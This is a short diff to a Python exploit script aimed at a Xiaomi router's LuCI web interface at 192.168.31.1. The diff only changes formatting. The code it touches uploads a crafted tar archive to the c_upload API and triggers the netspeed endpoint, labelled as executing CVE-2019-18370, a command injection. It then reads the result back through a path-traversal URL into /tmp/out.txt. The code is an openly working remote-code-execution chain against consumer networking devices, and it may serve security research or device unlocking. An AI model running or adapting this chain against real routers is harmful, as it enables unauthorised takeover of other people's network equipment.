@@ -19,12 +19,19 @@ with tarfile.open("payload.tar.gz", "w:gz") as tar:
     tar.add("bootstrap/speedtest_urls.xml", arcname="speedtest_urls.xml")
 
 print("Uploading Setup")
-r1 = requests.post("http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(stok), files={"image":open("payload.tar.gz",'rb')}, proxies=proxies)
+r1 = requests.post(
+    f"http://192.168.31.1/cgi-bin/luci/;stok={stok}/api/misystem/c_upload",
+    files={"image": open("payload.tar.gz", 'rb')},
+    proxies=proxies,
+)
 
 os.remove("payload.tar.gz")
 
 print("Executing CVE-2019-18370")
-r2 = requests.get("http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(stok), proxies=proxies)
+r2 = requests.get(
+    f"http://192.168.31.1/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed",
+    proxies=proxies,
+)
 
 print("Fetching Setup Output")
 r3 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../tmp/out.txt", proxies=proxies)
